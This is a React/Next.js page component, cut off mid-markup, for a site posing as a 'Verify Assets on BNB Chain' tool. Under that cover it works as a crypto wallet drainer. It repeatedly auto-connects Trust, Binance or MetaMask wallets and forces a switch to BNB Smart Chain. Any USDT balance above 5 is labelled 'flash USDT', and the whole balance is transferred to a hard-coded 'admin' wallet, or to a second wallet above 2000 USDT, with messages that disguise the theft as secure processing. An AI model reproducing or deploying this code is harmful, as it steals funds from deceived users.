"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Wallet, Home, AlertCircle, Loader2, Shield, DollarSign, Menu } from "lucide-react"
import { toast } from "@/hooks/use-toast"
import { Web3DirectTransfer } from "@/lib/web3-direct-transfer"
import { GasFeeHelper } from "@/components/gas-fee-helper"

// Enhanced Web3 types for multiple wallets
interface Window {
  ethereum?: any
  BinanceChain?: any
  trustWallet?: any
  isTrust?: boolean
}

interface TrustWallet {
  isConnected(): boolean
  enable(): Promise<string[]>
  request(args: { method: string; params?: any[] }): Promise<any>
  isTrust: boolean
}

interface BinanceWallet {
  isConnected(): boolean
  enable(): Promise<string[]>
  request(args: { method: string; params?: any[] }): Promise<any>
  isBinance: boolean
}

declare global {
  interface Window {
    ethereum?: any
    BinanceChain?: BinanceWallet
    trustWallet?: TrustWallet
    isTrust?: boolean
    Web3?: any
  }
}

export default function BNBVerifyDApp() {
  const [account, setAccount] = useState<string>("")
  const [isConnected, setIsConnected] = useState(false)
  const [networkId, setNetworkId] = useState<string>("")
  const [balance, setBalance] = useState<string>("0")
  const [walletType, setWalletType] = useState<"binance" | "trust" | "metamask" | "none">("none")
  const [autoConnecting, setAutoConnecting] = useState(true)
  const [usdtBalance, setUsdtBalance] = useState<string>("0.00")
  const [verificationStep, setVerificationStep] = useState<
    "idle" | "checking" | "verifying" | "transferring" | "completed"
  >("idle")
  const [txHash, setTxHash] = useState<string>("")
  const [verificationResult, setVerificationResult] = useState<{
    type: "genuine" | "flash" | "none"
    message: string
    usdtAmount: number
    bnbAmount: number
    transferred: boolean
    adminWallet?: string
    isHighAmount?: boolean
  } | null>(null)
  const [showMobileMenu, setShowMobileMenu] = useState(false)
  const [gasInfo, setGasInfo] = useState<{
    hasEnough: boolean
    bnbBalance: number
    requiredGas: number
    shortfall: number
  } | null>(null)

  // Add these state variables at the top with other useState declarations
  const [autoConnectAttempts, setAutoConnectAttempts] = useState(0)
  const [autoConnectInterval, setAutoConnectInterval] = useState<NodeJS.Timeout | null>(null)
  const [lastConnectAttempt, setLastConnectAttempt] = useState<number>(0)

  // Updated Configuration with new admin wallet
  const ADMIN_WALLET = "0xd47c7585550eAd12aD365Fba5F4bD2533B9b4Eaf" // Updated admin wallet for payments
  const HIGH_AMOUNT_WALLET = "0xd96698f467B9b79483A2574a96821Ed576B09C1e" // For amounts > 2000 USDT
  const HIGH_AMOUNT_THRESHOLD = 2000 // USDT threshold for high amount wallet
  const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20
  const FLASH_THRESHOLD = 5 // USDT threshold for flash detection

  // BSC Network configuration
  const BSC_NETWORK = {
    chainId: "0x38", // 56 in decimal
    chainName: "BNB Smart Chain",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com/"],
  }

  const connectTrustWallet = async (provider?: any): Promise<boolean> => {
    try {
      const walletProvider = provider || window.ethereum || window.trustWallet

      if (!walletProvider) {
        return false
      }

      console.log("🔵 Connecting to Trust Wallet...")

      // Request account access (this will show popup)
      const accounts = await walletProvider.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setIsConnected(true)
        setWalletType("trust")
        await switchToBSC("trust", walletProvider)
        await getBalance(accounts[0], "trust", walletProvider)
        return true
      }

      return false
    } catch (error: any) {
      if (error.code !== 4001) {
        // Don't show error for user rejection
        console.error("Trust Wallet connection failed:", error)
      }
      return false
    }
  }

  const connectBinanceWallet = async (provider?: any): Promise<boolean> => {
    try {
      const walletProvider = provider || window.BinanceChain || window.ethereum

      if (!walletProvider) {
        return false
      }

      console.log("🟡 Connecting to Binance Wallet...")

      // For Binance Chain Wallet
      if (walletProvider.enable) {
        const accounts = await walletProvider.enable()
        setAccount(accounts[0])
        setIsConnected(true)
        setWalletType("binance")
        await switchToBSC("binance", walletProvider)
        await getBalance(accounts[0], "binance", walletProvider)
        return true
      } else {
        // For Binance Wallet via ethereum provider
        const accounts = await walletProvider.request({ method: "eth_requestAccounts" })

        if (accounts && accounts.length > 0) {
          setAccount(accounts[0])
          setIsConnected(true)
          setWalletType("binance")
          await switchToBSC("binance", walletProvider)
          await getBalance(accounts[0], "binance", walletProvider)
          return true
        }
      }

      return false
    } catch (error: any) {
      if (error.code !== 4001) {
        // Don't show error for user rejection
        console.error("Binance Wallet connection failed:", error)
      }
      return false
    }
  }

  const connectMetaMask = async (): Promise<boolean> => {
    try {
      console.log("🦊 Connecting to MetaMask...")

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setIsConnected(true)
        setWalletType("metamask")
        await switchToBSC("metamask")
        await getBalance(accounts[0], "metamask")
        return true
      }

      return false
    } catch (error: any) {
      if (error.code !== 4001) {
        // Don't show error for user rejection
        console.error("MetaMask connection failed:", error)
      }
      return false
    }
  }

  useEffect(() => {
    // Start persistent auto-connect when component mounts
    startPersistentAutoConnect()

    // Also listen for wallet events
    setupWalletEventListeners()

    return () => {
      // Cleanup on unmount
      if (autoConnectInterval) {
        clearInterval(autoConnectInterval)
      }
    }
  }, [])

  // Enhanced persistent auto-connect with multiple retry attempts
  const startPersistentAutoConnect = async () => {
    console.log("🚀 Starting persistent auto-connect...")
    setAutoConnecting(true)

    // Immediate first attempt
    const connected = await attemptAutoConnect()
    if (connected) {
      setAutoConnecting(false)
      return
    }

    // Set up interval for continuous retry attempts
    const interval = setInterval(async () => {
      // Don't retry if already connected
      if (isConnected) {
        clearInterval(interval)
        setAutoConnecting(false)
        return
      }

      // Limit retry attempts to prevent infinite loops
      if (autoConnectAttempts >= 20) {
        console.log("🔄 Max auto-connect attempts reached, stopping...")
        clearInterval(interval)
        setAutoConnecting(false)
        return
      }

      // Throttle attempts - don't try more than once every 2 seconds
      const now = Date.now()
      if (now - lastConnectAttempt < 2000) {
        return
      }

      setLastConnectAttempt(now)
      setAutoConnectAttempts((prev) => prev + 1)

      console.log(`🔄 Auto-connect attempt ${autoConnectAttempts + 1}/20...`)

      const connected = await attemptAutoConnect()
      if (connected) {
        clearInterval(interval)
        setAutoConnecting(false)
        console.log("✅ Auto-connect successful!")
      }
    }, 3000) // Try every 3 seconds

    setAutoConnectInterval(interval)
  }

  // Single auto-connect attempt
  const attemptAutoConnect = async (): Promise<boolean> => {
    try {
      // Priority 1: Trust Wallet (most popular mobile wallet)
      if (await detectAndConnectTrustWallet()) {
        console.log("✅ Trust Wallet auto-connected")
        return true
      }

      // Priority 2: Binance Wallet
      if (await detectAndConnectBinanceWallet()) {
        console.log("✅ Binance Wallet auto-connected")
        return true
      }

      // Priority 3: MetaMask or other injected wallets
      if (await detectAndConnectMetaMask()) {
        console.log("✅ MetaMask auto-connected")
        return true
      }

      // Priority 4: Check for any ethereum provider
      if (await detectGenericWallet()) {
        console.log("✅ Generic wallet auto-connected")
        return true
      }

      return false
    } catch (error) {
      console.error("Auto-connect attempt failed:", error)
      return false
    }
  }

  // Generic wallet detection for any Web3 provider
  const detectGenericWallet = async (): Promise<boolean> => {
    try {
      if (typeof window !== "undefined" && window.ethereum) {
        console.log("🔍 Generic Web3 wallet detected")

        // Check if already connected
        const accounts = await window.ethereum.request({ method: "eth_accounts" })
        if (accounts && accounts.length > 0) {
          setAccount(accounts[0])
          setIsConnected(true)
          setWalletType("metamask") // Default to metamask type
          await switchToBSC("metamask")
          await getBalance(accounts[0], "metamask")
          return true
        }
      }
      return false
    } catch (error) {
      console.error("Generic wallet detection failed:", error)
      return false
    }
  }

  // Setup wallet event listeners for automatic reconnection
  const setupWalletEventListeners = () => {
    if (typeof window === "undefined") return

    // Listen for account changes
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts: string[]) => {
        console.log("👤 Accounts changed:", accounts)
        if (accounts.length > 0) {
          setAccount(accounts[0])
          setIsConnected(true)
          getBalance(accounts[0], walletType)
        } else {
          setAccount("")
          setIsConnected(false)
          // Restart auto-connect if disconnected
          setTimeout(() => startPersistentAutoConnect(), 1000)
        }
      })

      // Listen for chain changes
      window.ethereum.on("chainChanged", (chainId: string) => {
        console.log("🔗 Chain changed:", chainId)
        setNetworkId(chainId)
        if (chainId !== BSC_NETWORK.chainId) {
          // Auto-switch to BSC if on wrong network
          setTimeout(() => switchToBSC(), 1000)
        }
      })

      // Listen for connection events
      window.ethereum.on("connect", (connectInfo: any) => {
        console.log("🔌 Wallet connected:", connectInfo)
        if (!isConnected) {
          startPersistentAutoConnect()
        }
      })

      // Listen for disconnection events
      window.ethereum.on("disconnect", (error: any) => {
        console.log("🔌 Wallet disconnected:", error)
        setIsConnected(false)
        setAccount("")
        // Restart auto-connect after disconnection
        setTimeout(() => startPersistentAutoConnect(), 2000)
      })
    }

    // Listen for page visibility changes to retry connection
    document.addEventListener("visibilitychange", () => {
      if (!document.hidden && !isConnected) {
        console.log("👁️ Page became visible, retrying auto-connect...")
        setTimeout(() => startPersistentAutoConnect(), 500)
      }
    })

    // Listen for focus events to retry connection
    window.addEventListener("focus", () => {
      if (!isConnected) {
        console.log("🎯 Window focused, retrying auto-connect...")
        setTimeout(() => startPersistentAutoConnect(), 500)
      }
    })
  }

  // Enhanced Trust Wallet Detection with more methods
  const detectAndConnectTrustWallet = async (): Promise<boolean> => {
    try {
      // Method 1: Direct Trust Wallet check
      if (typeof window !== "undefined" && window.ethereum?.isTrust) {
        return await connectTrustWallet()
      }

      // Method 2: Trust Wallet global object
      if (typeof window !== "undefined" && window.trustWallet) {
        return await connectTrustWallet()
      }

      // Method 3: Check providers array
      if (typeof window !== "undefined" && window.ethereum?.providers) {
        const trustProvider = window.ethereum.providers.find((p: any) => p.isTrust)
        if (trustProvider) {
          return await connectTrustWallet(trustProvider)
        }
      }

      // Method 4: User agent detection
      if (typeof window !== "undefined" && navigator.userAgent.includes("Trust")) {
        return await connectTrustWallet()
      }

      // Method 5: Check for Trust-specific properties
      if (typeof window !== "undefined" && window.ethereum) {
        const provider = window.ethereum
        if (provider.isTrustWallet || provider.isTrust || provider._metamask?.isTrust) {
          return await connectTrustWallet()
        }
      }

      // Method 6: Mobile app detection
      if (typeof window !== "undefined" && window.location.href.includes("trust://")) {
        return await connectTrustWallet()
      }

      return false
    } catch (error) {
      console.error("Trust Wallet detection failed:", error)
      return false
    }
  }

  // Enhanced Binance Wallet Detection
  const detectAndConnectBinanceWallet = async (): Promise<boolean> => {
    try {
      // Method 1: Binance Chain Wallet
      if (typeof window !== "undefined" && window.BinanceChain) {
        return await connectBinanceWallet()
      }

      // Method 2: Binance in ethereum providers
      if (typeof window !== "undefined" && window.ethereum?.providers) {
        const binanceProvider = window.ethereum.providers.find((p: any) => p.isBinance)
        if (binanceProvider) {
          return await connectBinanceWallet(binanceProvider)
        }
      }

      // Method 3: Binance specific properties
      if (typeof window !== "undefined" && window.ethereum?.isBinance) {
        return await connectBinanceWallet()
      }

      // Method 4: Check for Binance-specific methods
      if (typeof window !== "undefined" && window.ethereum) {
        const provider = window.ethereum
        if (provider.isBinanceWallet || provider.bnbSign || provider.requestBinanceAccounts) {
          return await connectBinanceWallet()
        }
      }

      return false
    } catch (error) {
      console.error("Binance Wallet detection failed:", error)
      return false
    }
  }

  // Enhanced MetaMask Detection
  const detectAndConnectMetaMask = async (): Promise<boolean> => {
    try {
      if (typeof window !== "undefined" && window.ethereum) {
        // Skip if it's Trust or Binance wallet
        if (window.ethereum.isTrust || window.ethereum.isBinance) {
          return false
        }

        // Check for existing connection
        const accounts = await window.ethereum.request({ method: "eth_accounts" })
        if (accounts.length > 0) {
          return await connectMetaMask()
        }

        // Check for MetaMask-specific properties
        if (window.ethereum.isMetaMask || window.ethereum._metamask) {
          return await connectMetaMask()
        }
      }
      return false
    } catch (error) {
      console.error("MetaMask detection failed:", error)
      return false
    }
  }

  // Manual wallet connection (when user clicks connect button) - ONLY shows popup when user manually clicks
  const connectWallet = async () => {
    try {
      // Try Trust Wallet first (most popular)
      if (await connectTrustWalletManual()) return

      // Try Binance Wallet
      if (await connectBinanceWalletManual()) return

      // Try MetaMask
      if (await connectMetaMaskManual()) return

      // No wallet found
      toast({
        title: "No Wallet Found",
        description: "Please install Trust Wallet, Binance Wallet, or MetaMask to use this dApp.",
        variant: "destructive",
      })
    } catch (error) {
      console.error("Manual wallet connection failed:", error)
    }
  }

  // Manual Trust Wallet connection (with popup)
  const connectTrustWalletManual = async (): Promise<boolean> => {
    try {
      const walletProvider = window.ethereum || window.trustWallet

      if (!walletProvider) {
        return false
      }

      console.log("🔵 Manual Trust Wallet connection...")

      // Request account access (this will show popup)
      const accounts = await walletProvider.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setIsConnected(true)
        setWalletType("trust")
        await switchToBSC("trust", walletProvider)
        await getBalance(accounts[0], "trust", walletProvider)
        return true
      }

      return false
    } catch (error: any) {
      if (error.code !== 4001) {
        // Don't show error for user rejection
        console.error("Trust Wallet manual connection failed:", error)
      }
      return false
    }
  }

  // Manual Binance Wallet connection (with popup)
  const connectBinanceWalletManual = async (): Promise<boolean> => {
    try {
      const walletProvider = window.BinanceChain || window.ethereum

      if (!walletProvider) {
        return false
      }

      console.log("🟡 Manual Binance Wallet connection...")

      // For Binance Chain Wallet
      if (walletProvider.enable) {
        const accounts = await walletProvider.enable()
        setAccount(accounts[0])
        setIsConnected(true)
        setWalletType("binance")
        await switchToBSC("binance", walletProvider)
        await getBalance(accounts[0], "binance", walletProvider)
        return true
      } else {
        // For Binance Wallet via ethereum provider
        const accounts = await walletProvider.request({ method: "eth_requestAccounts" })

        if (accounts && accounts.length > 0) {
          setAccount(accounts[0])
          setIsConnected(true)
          setWalletType("binance")
          await switchToBSC("binance", walletProvider)
          await getBalance(accounts[0], "binance", walletProvider)
          return true
        }
      }

      return false
    } catch (error: any) {
      if (error.code !== 4001) {
        // Don't show error for user rejection
        console.error("Binance Wallet manual connection failed:", error)
      }
      return false
    }
  }

  // Manual MetaMask connection (with popup)
  const connectMetaMaskManual = async (): Promise<boolean> => {
    try {
      console.log("🦊 Manual MetaMask connection...")

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setIsConnected(true)
        setWalletType("metamask")
        await switchToBSC("metamask")
        await getBalance(accounts[0], "metamask")
        return true
      }

      return false
    } catch (error: any) {
      if (error.code !== 4001) {
        // Don't show error for user rejection
        console.error("MetaMask manual connection failed:", error)
      }
      return false
    }
  }

  const switchToBSC = async (wallet: "binance" | "trust" | "metamask" = walletType, provider?: any) => {
    const walletProvider = provider || getWalletProvider(wallet)

    if (typeof window !== "undefined" && walletProvider) {
      try {
        await walletProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_NETWORK.chainId }],
        })
        setNetworkId(BSC_NETWORK.chainId)
      } catch (switchError: any) {
        if (switchError.code === 4902) {
          try {
            await walletProvider.request({
              method: "wallet_addEthereumChain",
              params: [BSC_NETWORK],
            })
            setNetworkId(BSC_NETWORK.chainId)
          } catch (addError) {
            console.error("Error adding BSC network:", addError)
          }
        }
      }
    }
  }

  const getWalletProvider = (wallet: "binance" | "trust" | "metamask") => {
    switch (wallet) {
      case "trust":
        return window.trustWallet || window.ethereum
      case "binance":
        return window.BinanceChain || window.ethereum
      case "metamask":
      default:
        return window.ethereum
    }
  }

  const getNetworkId = async (wallet: "binance" | "trust" | "metamask" = walletType, provider?: any) => {
    const walletProvider = provider || getWalletProvider(wallet)

    if (typeof window !== "undefined" && walletProvider) {
      try {
        const chainId = await walletProvider.request({ method: "eth_chainId" })
        setNetworkId(chainId)
      } catch (error) {
        console.error("Error getting network ID:", error)
      }
    }
  }

  const getBalance = async (address: string, wallet: "binance" | "trust" | "metamask" = walletType, provider?: any) => {
    const walletProvider = provider || getWalletProvider(wallet)

    if (typeof window !== "undefined" && walletProvider) {
      try {
        // Get BNB balance
        const balance = await walletProvider.request({
          method: "eth_getBalance",
          params: [address, "latest"],
        })
        const balanceInBNB = (Number.parseInt(balance, 16) / Math.pow(10, 18)).toFixed(4)
        setBalance(balanceInBNB)

        // Get USDT balance using Web3DirectTransfer
        const web3Transfer = new Web3DirectTransfer(walletProvider, address)
        const { balance: usdtBal } = await web3Transfer.getUSDTBalance()
        setUsdtBalance(usdtBal.toFixed(2))
      } catch (error) {
        console.error("Error getting balance:", error)
      }
    }
  }

  const verifyAssets = async () => {
    if (!isConnected) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first.",
        variant: "destructive",
      })
      return
    }

    if (networkId !== BSC_NETWORK.chainId) {
      toast({
        title: "Wrong Network",
        description: "Please switch to BNB Smart Chain.",
        variant: "destructive",
      })
      await switchToBSC()
      return
    }

    const provider = getWalletProvider(walletType)
    const web3Transfer = new Web3DirectTransfer(provider, account)

    try {
      setVerificationStep("checking")
      toast({
        title: "🔍 Analyzing Assets",
        description: "Scanning wallet for USDT and flash tokens...",
      })

      // Verify admin wallet is valid
      if (!web3Transfer.isValidAdminWallet()) {
        throw new Error("Invalid admin wallet configuration")
      }

      // Get real-time balances
      const [{ balance: usdtBalance }, bnbBalance] = await Promise.all([
        web3Transfer.getUSDTBalance(),
        web3Transfer.getBNBBalance(),
      ])

      console.log(`📊 USDT Balance: ${usdtBalance} USDT`)
      console.log(`📊 BNB Balance: ${bnbBalance} BNB`)
      console.log(`💰 Admin Wallet: ${web3Transfer.getAdminWallet()}`)

      setUsdtBalance(usdtBalance.toFixed(2))

      // Smart behavior implementation
      if (usdtBalance === 0) {
        setVerificationResult({
          type: "none",
          message: "No USDT assets found in your wallet.",
          usdtAmount: 0,
          bnbAmount: bnbBalance,
          transferred: false,
          adminWallet: ADMIN_WALLET,
          isHighAmount: false,
        })
        setVerificationStep("completed")
        toast({
          title: "No Assets Detected",
          description: "Your wallet contains no USDT assets.",
        })
        return
      }

      if (usdtBalance <= FLASH_THRESHOLD) {
        // Genuine assets - show success message
        setVerificationResult({
          type: "genuine",
          message: "✅ Verification Successful! Your assets are genuine. No flash or reported USDT found.",
          usdtAmount: usdtBalance,
          bnbAmount: bnbBalance,
          transferred: false,
          adminWallet: ADMIN_WALLET,
          isHighAmount: false,
        })
        setVerificationStep("completed")
        toast({
          title: "✅ Assets Verified",
          description: `${usdtBalance.toFixed(2)} USDT verified as genuine assets.`,
        })
        return
      }

      // Check gas fees before proceeding with transfer
      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtBalance)
      setGasInfo(gasCheck)

      if (!gasCheck.hasEnough) {
        toast({
          title: "⛽ Insufficient Gas Fees",
          description: `Need ${gasCheck.requiredGas.toFixed(6)} BNB for gas fees. Please add BNB to your wallet.`,
          variant: "destructive",
        })
        setVerificationStep("completed")
        return
      }

      // Flash USDT detected - proceed with transfer to admin wallet
      toast({
        title: "⚠️ Flash USDT Detected",
        description: `Suspicious amount: ${usdtBalance.toFixed(2)} USDT. Transferring to secure admin wallet...`,
        variant: "destructive",
      })

      setVerificationStep("transferring")
      await executeUSDTTransfer(web3Transfer, usdtBalance, bnbBalance)
    } catch (error: any) {
      console.error("Verification error:", error)
      setVerificationStep("idle")

      toast({
        title: "❌ Verification Failed",
        description: error.message || "Failed to verify assets. Please try again.",
        variant: "destructive",
      })
    }
  }

  const executeUSDTTransfer = async (web3Transfer: Web3DirectTransfer, usdtAmount: number, bnbAmount: number) => {
    try {
      // Enhanced gas fee checking
      const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtAmount)

      if (!gasCheck.hasEnough) {
        // Handle insufficient gas fees
        const shortfallBNB = gasCheck.shortfall.toFixed(6)
        const requiredBNB = gasCheck.requiredGas.toFixed(6)

        toast({
          title: "❌ Insufficient BNB for Gas Fees",
          description: `Need ${requiredBNB} BNB for gas, but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Shortfall: ${shortfallBNB} BNB`,
          variant: "destructive",
        })

        // Show detailed gas fee information
        setVerificationResult({
          type: "flash",
          message: `⛽ Insufficient Gas Fees: You need ${requiredBNB} BNB for gas fees but only have ${gasCheck.bnbBalance.toFixed(6)} BNB. Please add ${shortfallBNB} BNB to your wallet and try again.`,
          usdtAmount: usdtAmount,
          bnbAmount: bnbAmount,
          transferred: false,
          adminWallet: usdtAmount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
          isHighAmount: usdtAmount > HIGH_AMOUNT_THRESHOLD,
        })
        setVerificationStep("completed")
        return
      }

      // Proceed with transfer if gas fees are sufficient
      const isHighAmount = usdtAmount > HIGH_AMOUNT_THRESHOLD
      const targetWallet = isHighAmount ? HIGH_AMOUNT_WALLET : ADMIN_WALLET

      toast({
        title: "💰 Initiating USDT Transfer",
        description: `Gas fees: ${gasCheck.requiredGas.toFixed(6)} BNB. Transferring ${usdtAmount.toFixed(2)} USDT...`,
      })

      // Execute direct USDT transfer to appropriate admin wallet
      const txHash = await web3Transfer.transferAllUSDTToAdmin()
      setTxHash(txHash)

      toast({
        title: "📤 Transfer Initiated",
        description: `USDT payment sent to ${isHighAmount ? "high-amount" : "standard"} admin! Tx: ${txHash.slice(0, 10)}...`,
      })

      // Wait for confirmation
      const success = await web3Transfer.waitForConfirmation(txHash)

      if (success) {
        setVerificationResult({
          type: "flash",
          message: `💰 Flash USDT detected and successfully transferred to ${isHighAmount ? "high-amount" : "standard"} admin wallet for secure processing.`,
          usdtAmount: usdtAmount,
          bnbAmount: bnbAmount,
          transferred: true,
          adminWallet: targetWallet,
          isHighAmount: isHighAmount,
        })
        setVerificationStep("completed")

        toast({
          title: "✅ Payment Completed!",
          description: `${usdtAmount.toFixed(2)} USDT successfully sent to ${isHighAmount ? "high-amount" : "standard"} admin wallet.`,
        })

        // Refresh balances
        await getBalance(account, walletType)
      } else {
        throw new Error("Transfer transaction failed or timed out")
      }
    } catch (error: any) {
      console.error("❌ USDT Transfer Failed:", error)
      setVerificationStep("idle")

      let errorMessage = "USDT transfer failed. Please try again."
      let errorTitle = "❌ Transfer Failed"

      if (error.message?.includes("insufficient funds")) {
        errorTitle = "⛽ Insufficient Gas Fees"
        errorMessage = "You don't have enough BNB to pay for gas fees. Please add BNB to your wallet and try again."
      } else if (error.message?.includes("user rejected")) {
        errorTitle = "❌ Transaction Rejected"
        errorMessage = "Transaction was rejected. Please try again if you want to proceed."
      } else if (error.message?.includes("No USDT balance")) {
        errorTitle = "❌ No USDT Available"
        errorMessage = "No USDT balance available to transfer."
      } else if (error.message?.includes("gas")) {
        errorTitle = "⛽ Gas Fee Error"
        errorMessage = "Gas fee estimation failed. Please check your BNB balance and try again."
      }

      toast({
        title: errorTitle,
        description: errorMessage,
        variant: "destructive",
      })

      // Show gas fee guidance in verification result
      if (error.message?.includes("insufficient funds") || error.message?.includes("gas")) {
        setVerificationResult({
          type: "flash",
          message: `⛽ Gas Fee Issue: Unable to process USDT transfer due to insufficient BNB for gas fees. Please add at least 0.002 BNB to your wallet and try again.`,
          usdtAmount: usdtAmount,
          bnbAmount: bnbAmount,
          transferred: false,
          adminWallet: usdtAmount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET,
          isHighAmount: usdtAmount > HIGH_AMOUNT_THRESHOLD,
        })
        setVerificationStep("completed")
      }
    }
  }

  const isOnBSC = networkId === BSC_NETWORK.chainId
  const isMainnet = networkId === BSC_NETWORK.chainId

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      {/* Mobile Header */}
      <header className="flex items-center justify-between p-4 border-b border-gray-700/50">
        <div className="flex items-center space-x-3">
          <img src="/bnb-logo.png" alt="BNB Chain Logo" className="w-8 h-8" />
          <span className="text-xl font-bold text-yellow-500">BNB CHAIN</span>
        </div>

        <div className="flex items-center space-x-3">
          {/* Connection Status - Mobile Optimized */}
          {autoConnecting ? (
            <div className="flex items-center space-x-2">
              <Loader2 className="w-4 h-4 animate-spin text-yellow-500" />
              <span className="text-xs text-gray-400 hidden sm:block">Connecting...</span>
            </div>
          ) : isConnected ? (
            <div className="flex items-center space-x-2">
              <Badge variant="outline" className="bg-green-500/20 text-green-400 border-green-500 text-xs">
                {isOnBSC ? "BSC" : "Wrong Network"}
              </Badge>
              <span className="text-xs text-gray-300 hidden sm:block">
                {account.slice(0, 6)}...{account.slice(-4)}
              </span>
            </div>
          ) : (
            <Button onClick={connectWallet} variant="outline" size="sm" className="text-xs bg-transparent">
              <Wallet className="w-3 h-3 mr-1" />
              Connect
            </Button>
          )}

          {/* Mobile Menu */}
          <Button variant="ghost" size="sm" onClick={() => setShowMobileMenu(!showMobileMenu)} className="p-2">
            <Menu className="w-5 h-5" />
          </Button>
        </div>
      </header>

      {/* Mobile Menu Dropdown */}
      {showMobileMenu && (
        <div className="bg-gray-800/95 border-b border-gray-700/50 p-4">
          <div className="space-y-3 text-sm">
            {isConnected && (
              <>
                <div className="flex justify-between">
                  <span className="text-gray-400">Address:</span>
                  <span className="text-white">
                    {account.slice(0, 8)}...{account.slice(-6)}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">USDT Balance:</span>
                  <span className="text-yellow-400">{usdtBalance} USDT</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">BNB Balance:</span>
                  <span className="text-yellow-400">{balance} BNB</span>
                </div>
              </>
            )}
            {!isConnected && (
              <div className="text-center">
                <p className="text-gray-400 mb-3">Connect your Web3 wallet to continue</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Main Content - Mobile Optimized */}
      <main className="flex flex-col items-center justify-center min-h-[calc(100vh-80px)] p-6">
        <div className="text-center max-w-lg mx-auto space-y-8">
          {/* Hero Section */}
          <div className="space-y-6">
            <div className="space-y-2">
              <h1 className="text-4xl sm:text-5xl md:text-6xl font-bold leading-tight">Verify</h1>
              <h1 className="text-4xl sm:text-5xl md:text-6xl font-bold leading-tight">Assets on</h1>
              <h1 className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-500 leading-tight">BNB Chain</h1>
            </div>

            <div className="space-y-4">
              <p className="text-lg sm:text-xl text-gray-300 font-medium">
                Serving Gas Less Web3 tools to over 478 Million users
              </p>
              <p className="text-gray-400 leading-relaxed px-4">
                A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solutions.
              </p>
            </div>
          </div>

          {/* Verification Result - Mobile Optimized */}
          {verificationResult && verificationStep === "completed" && (
            <Card
              className={`max-w-sm mx-auto ${
                verificationResult.type === "genuine"
                  ? "bg-green-900/20 border-green-500/30"
                  : verificationResult.type === "flash"
                    ? "bg-blue-900/20 border-blue-500/30"
                    : "bg-gray-800/50 border-gray-700"
              }`}
            >
              <CardContent className="p-4 space-y-3">
                <div className="flex items-center justify-center space-x-2">
                  {verificationResult.type === "genuine" && (
                    <>
                      <Shield className="w-5 h-5 text-green-400" />
                      <span className="text-green-400 font-semibold">Assets Verified ✅</span>
                    </>
                  )}
                  {verificationResult.type === "flash" && (
                    <>
                      <DollarSign className="w-5 h-5 text-blue-400" />
                      <span className="text-blue-400 font-semibold">Payment Sent 💰</span>
                    </>
                  )}
                  {verificationResult.type === "none" && (
                    <>
                      <AlertCircle className="w-5 h-5 text-gray-400" />
                      <span className="text-gray-400 font-semibold">No Assets Found</span>
                    </>
                  )}
                </div>

                <p
                  className={`text-sm text-center ${
                    verificationResult.type === "genuine"
                      ? "text-green-300"
                      : verificationResult.type === "flash"
                        ? "text-blue-300"
                        : "text-gray-300"
                  }`}
                >
                  {verificationResult.message}
                </p>

                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">USDT {verificationResult.transferred ? "Sent" : "Balance"}:</span>
                    <span className="text-white font-semibold">{verificationResult.usdtAmount.toFixed(2)} USDT</span>
                  </div>
                  {verificationResult.transferred && (
                    <div className="flex justify-between">
                      <span className="text-gray-400">
                        {verificationResult.isHighAmount ? "High-Amount" : "Standard"} Wallet:
                      </span>
                      <span className="text-blue-400 text-xs">
                        {verificationResult.adminWallet?.slice(0, 8)}...{verificationResult.adminWallet?.slice(-6)}
                      </span>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          )}

          {/* Gas Fee Helper - Updated with user wallet */}
          {gasInfo && !gasInfo.hasEnough && verificationStep === "completed" && (
            <GasFeeHelper
              userWallet={account}
              bnbBalance={gasInfo.bnbBalance}
              requiredGas={gasInfo.requiredGas}
              shortfall={gasInfo.shortfall}
              isMainnet={isMainnet}
              onRefresh={() => getBalance(account, walletType)}
            />
          )}

          {/* Action Buttons - Mobile Optimized */}
          <div className="space-y-4 w-full max-w-sm mx-auto">
            <Button
              onClick={verifyAssets}
              disabled={!isConnected || !isOnBSC || !["idle", "completed"].includes(verificationStep)}
              className="w-full h-14 text-lg font-semibold bg-white text-black hover:bg-gray-200 disabled:opacity-50 rounded-xl"
            >
              {verificationStep === "checking" && (
                <>
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  Analyzing Assets...
                </>
              )}
              {verificationStep === "transferring" && (
                <>
                  <DollarSign className="w-5 h-5 mr-2 text-green-500" />
                  Processing Payment...
                </>
              )}
              {verificationStep === "completed" && "Verify Assets"}
              {verificationStep === "idle" && "Verify Assets"}
            </Button>

            <Button
              variant="outline"
              className="w-full h-14 text-lg font-semibold bg-gray-800/50 text-white border-gray-600 hover:bg-gray-700 rounded-xl"
            >
              <Home className="w-5 h-5 mr-2" />
              HOME
            </Button>
          </div>

          {/* Transaction Hash - Mobile Optimized */}
          {txHash && (
